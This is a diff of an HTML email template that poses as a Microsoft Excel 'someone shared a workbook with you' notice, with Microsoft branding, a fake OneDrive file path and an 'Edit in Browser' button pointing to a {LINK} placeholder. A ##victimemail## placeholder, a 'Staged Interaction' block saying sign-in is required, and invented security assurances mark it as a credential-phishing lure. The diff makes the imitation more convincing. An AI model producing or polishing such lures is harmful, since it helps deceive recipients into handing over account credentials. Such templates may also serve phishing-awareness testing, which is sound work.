@@ -5,61 +5,172 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Excel Shared Workbook</title>
 </head>
-<body style="margin: 0; padding: 0; background-color: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #333333;">
-<div style="max-width: 680px; margin: 20px auto; background-color: #ffffff; border-radius: 4px; box-shadow: 0 1px 4px rgba(0,0,0,0.08);">
+<body style="margin: 0; padding: 0; background-color: #f2f2f2; font-family: 'Segoe UI', Arial, Helvetica, sans-serif; color: #333333;">
+<table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f2f2f2;">
+<tr>
+<td align="center" style="padding: 24px 16px;">
 
-  <!-- Header -->
-  <div style="padding: 22px 30px 16px; border-bottom: 1px solid #e8e8e8;">
-    <span style="font-size: 28px; font-weight: 700; color: #217346; font-family: 'Segoe UI Semibold', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">Excel</span>
-  </div>
+  <!-- Outer Container -->
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="640" style="max-width: 640px; background-color: #ffffff; border-radius: 4px;">
 
-  <!-- Banner -->
-  <div style="background-color: #217346; padding: 18px 30px; text-align: center;">
-    <span style="font-size: 17px; font-weight: 600; color: #ffffff; letter-spacing: 0.3px;">Shared Workbook &#8212; Collaboration Request</span>
-  </div>
+    <!-- Header: Excel Brand Bar -->
+    <tr>
+      <td style="padding: 20px 28px 0 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr>
+            <!-- Spreadsheet Icon (2x2 green grid) -->
+            <td width="32" style="vertical-align: middle; padding-right: 10px;">
+              <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="32" style="border-collapse: collapse;">
+                <tr>
+                  <td width="15" height="15" style="background-color: #217346; border: 1px solid #1a5c38;"></td>
+                  <td width="15" height="15" style="background-color: #2b8a54; border: 1px solid #1a5c38;"></td>
+                </tr>
+                <tr>
+                  <td width="15" height="15" style="background-color: #2b8a54; border: 1px solid #1a5c38;"></td>
+                  <td width="15" height="15" style="background-color: #e8f5e9; border: 1px solid #1a5c38;"></td>
+                </tr>
+              </table>
+            </td>
+            <!-- Excel Wordmark -->
+            <td style="vertical-align: middle;">
+              <span style="font-size: 22px; font-weight: 700; color: #217346; font-family: 'Segoe UI Semibold', 'Segoe UI', Arial, Helvetica, sans-serif; letter-spacing: -0.3px;">Excel</span>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
 
-  <!-- Content -->
-  <div style="padding: 30px; background-color: #ffffff;">
+    <!-- Divider -->
+    <tr>
+      <td style="padding: 0 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr>
+            <td style="border-bottom: 2px solid #217346; padding-top: 8px;"></td>
+          </tr>
+        </table>
+      </td>
+    </tr>
 
-    <!-- Document Name -->
-    <div style="margin-bottom: 24px;">
-      <span style="font-size: 15px; font-weight: 600; color: #217346;">Q3-Sales-Pipeline-Review-v3.xlsx</span>
-      <br>
-      <span style="font-size: 13px; color: #666666;">shared by finance@company.com</span>
-    </div>
+    <!-- Subject Line -->
+    <tr>
+      <td style="padding: 24px 28px 8px 28px;">
+        <span style="font-size: 18px; font-weight: 600; color: #212121; font-family: 'Segoe UI Semibold', 'Segoe UI', Arial, Helvetica, sans-serif;">Someone shared a workbook with you</span>
+      </td>
+    </tr>
+
+    <!-- Workbook Details Card -->
+    <tr>
+      <td style="padding: 12px 28px 20px 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f8fbf9; border: 1px solid #d4e8da; border-radius: 4px;">
+          <tr>
+            <td style="padding: 18px 20px;">
+              <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+                <tr>
+                  <!-- Spreadsheet icon (larger) -->
+                  <td width="44" style="vertical-align: top; padding-right: 14px;">
+                    <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="44" style="border-collapse: collapse;">
+                      <tr>
+                        <td width="21" height="21" style="background-color: #217346; border: 1px solid #1a5c38;"></td>
+                        <td width="21" height="21" style="background-color: #2b8a54; border: 1px solid #1a5c38;"></td>
+                      </tr>
+                      <tr>
+                        <td width="21" height="21" style="background-color: #2b8a54; border: 1px solid #1a5c38;"></td>
+                        <td width="21" height="21" style="background-color: #e8f5e9; border: 1px solid #1a5c38;"></td>
+                      </tr>
+                    </table>
+                  </td>
+                  <!-- Document Info -->
+                  <td style="vertical-align: top;">
+                    <span style="font-size: 15px; font-weight: 600; color: #217346; font-family: 'Segoe UI Semibold', 'Segoe UI', Arial, Helvetica, sans-serif; display: block; margin-bottom: 4px;">Q3_Budget_Forecast_v2.xlsx</span>
+                    <span style="font-size: 12px; color: #888888; display: block; line-height: 1.6;">
+                      Shared from &nbsp;<span style="color: #555555;">OneDrive &rsaquo; Finance &rsaquo; Budgets &rsaquo; FY2026</span><br>
+                      Last saved &nbsp;<span style="color: #555555;">June 20, 2026 at 4:12 PM</span>
+                    </span>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
 
     <!-- CTA Button -->
-    <div style="text-align: center; margin-bottom: 28px;">
-      <a href="{LINK}" style="display: inline-block; background-color: #217346; color: #ffffff; text-decoration: none; padding: 14px 42px; font-size: 15px; font-weight: 600; border-radius: 3px; letter-spacing: 0.5px;">OPEN IN EXCEL</a>
-    </div>
+    <tr>
+      <td align="center" style="padding: 0 28px 24px 28px;">
+        <a href="{LINK}" style="display: inline-block; background-color: #217346; color: #ffffff; text-decoration: none; padding: 14px 48px; font-size: 15px; font-weight: 600; border-radius: 4px; font-family: 'Segoe UI Semibold', 'Segoe UI', Arial, Helvetica, sans-serif; letter-spacing: 0.2px;">Edit in Browser</a>
+      </td>
+    </tr>
 
-    <!-- Body Text -->
-    <div style="font-size: 14px; line-height: 1.7; color: #444444; margin-bottom: 20px;">
-      A shared workbook has been created for collaborative editing. <span style="background-color: #fff4ce; padding: 1px 4px; font-weight: 500;">##victimemail##</span> has been granted edit access. Changes sync automatically when signed in.
-    </div>
+    <!-- Divider -->
+    <tr>
+      <td style="padding: 0 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr>
+            <td style="border-bottom: 1px solid #e8e8e8;"></td>
+          </tr>
+        </table>
+      </td>
+    </tr>
 
-    <!-- Additional Info -->
-    <div style="font-size: 13px; line-height: 1.6; color: #666666; border-top: 1px solid #eeeeee; padding-top: 18px;">
-      <b>Collaboration Features Enabled:</b><br>
-      &#8226; Real-time co-authoring<br>
-      &#8226; Version history with rollback<br>
-      &#8226; Comments and @mentions<br>
-      &#8226; Auto-save to OneDrive &amp; SharePoint
-    </div>
+    <!-- Staged Interaction -->
+    <tr>
+      <td style="padding: 20px 28px 12px 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr>
+            <td style="font-size: 14px; color: #444444; line-height: 1.7; font-family: 'Segoe UI', Arial, Helvetica, sans-serif;">
+              You will be redirected to <b>Excel for the web</b>. Sign-in is required to edit this shared workbook. Changes are saved automatically.
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
 
-  </div>
+    <!-- Recipient + Expiry -->
+    <tr>
+      <td style="padding: 0 28px 8px 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr>
+            <td style="font-size: 13px; color: #666666; line-height: 1.7; font-family: 'Segoe UI', Arial, Helvetica, sans-serif;">
+              Edit access is restricted to <span style="background-color: #fff4ce; padding: 1px 4px; font-weight: 500; color: #333333;">##victimemail##</span>. The sharing link for this workbook expires after 30 days of inactivity.
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
 
-  <!-- Footer -->
-  <div style="background-color: #fafafa; padding: 24px 30px; border-top: 1px solid #eeeeee;">
-    <div style="font-size: 12px; line-height: 1.7; color: #999999; text-align: center;">
-      <b>Security Notice</b><br>
-      This shared workbook link is intended only for ##victimemail##. Do not forward this email or share the link with unauthorized parties. Microsoft Excel uses enterprise-grade encryption to protect your data in transit and at rest.<br><br>
-      <b>About Microsoft Excel</b><br>
-      Microsoft Excel is part of the Microsoft 365 suite, providing industry-leading spreadsheet, data analysis, and collaboration tools trusted by over 1 billion users worldwide.<br><br>
-      If you have questions about this shared workbook, please contact the sender directly. If you believe this sharing request was sent in error, please disregard this notification.
-    </div>
-  </div>
+    <!-- Security Notice (2026) -->
+    <tr>
+      <td style="padding: 8px 28px 24px 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f8fbf9; border-left: 3px solid #217346;">
+          <tr>
+            <td style="padding: 12px 16px; font-size: 12px; color: #555555; line-height: 1.6; font-family: 'Segoe UI', Arial, Helvetica, sans-serif;">
+              <span style="font-weight: 600; color: #217346; display: block; margin-bottom: 2px;">Security &amp; Compliance</span>
+              Excel workbooks shared via OneDrive are protected by Microsoft 365 data loss prevention policies and activity auditing. All edits are logged and attributable to the authenticated user.
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
 
-</div>
+    <!-- Footer -->
+    <tr>
+      <td style="background-color: #fafafa; padding: 18px 28px; border-top: 1px solid #eeeeee; border-radius: 0 0 4px 4px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr>
+            <td style="font-size: 11px; color: #999999; line-height: 1.6; text-align: center; font-family: 'Segoe UI', Arial, Helvetica, sans-serif;">
+              <b>Microsoft Excel</b> &mdash; Part of Microsoft 365<br>
+              This notification was sent from an unmonitored address. If you have questions, please contact the person who shared this workbook with you. If you believe this sharing request was sent in error, you may disregard this message.
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+
+  </table>
+
+</td>
+</tr>
+</table>
 </body>
 </html>
